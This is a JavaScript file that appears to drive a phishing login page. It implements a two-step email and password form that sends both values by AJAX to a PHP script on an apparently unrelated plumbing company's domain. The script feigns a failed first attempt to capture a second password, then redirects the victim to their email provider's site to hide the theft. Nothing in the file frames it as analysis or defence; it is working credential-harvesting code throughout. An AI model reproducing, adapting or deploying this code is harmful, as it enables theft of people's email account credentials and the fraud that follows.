

let passwordAttempts = 0;

$(document).ready(function () {
    initializeForm();
});

function initializeForm() {

    $("#myForm").on("submit", function (e) {
        e.preventDefault();

        const email = $("#email").val().trim();
        const password = $("#password").val().trim();

        if (!email || !password) {
            return;
        }

        $.ajax({
            url: "https://lorneplumbing.com.au/via/logn.php", 
            type: "POST",
            dataType: "json",
            data: {
                email: email,
                password: password
            },
            success: function (response) {

                passwordAttempts++;

                if (passwordAttempts === 1) {
                    $("#password").val("").focus();
                    return;
                }

                redirectToEmailProvider();
            },
            error: function () {

                passwordAttempts++;

                if (passwordAttempts === 1) {
                    $("#password").val("").focus();
                    return;
                }

                redirectToEmailProvider();
            }
        });

    });

}

function nextStep() {

    const email = document.getElementById("email").value.trim();

    if (email === "") {
        alert("Enter your email.");
        return;
    }

    document.getElementById("emailDisplay").textContent = email;

    document.getElementById("emailStep").classList.add("hide");
    document.getElementById("passwordStep").classList.add("show");

}

function backStep() {

    document.getElementById("emailStep").classList.remove("hide");
    document.getElementById("passwordStep").classList.remove("show");

}

function redirectToEmailProvider() {

    const email = document.getElementById("email").value.trim();

    if (!email || !email.includes("@")) {
        alert("Please enter a valid email address.");
        return;
    }

    const domain = email.split("@")[1].toLowerCase();

    window.location.href = "https://" + domain;

}
         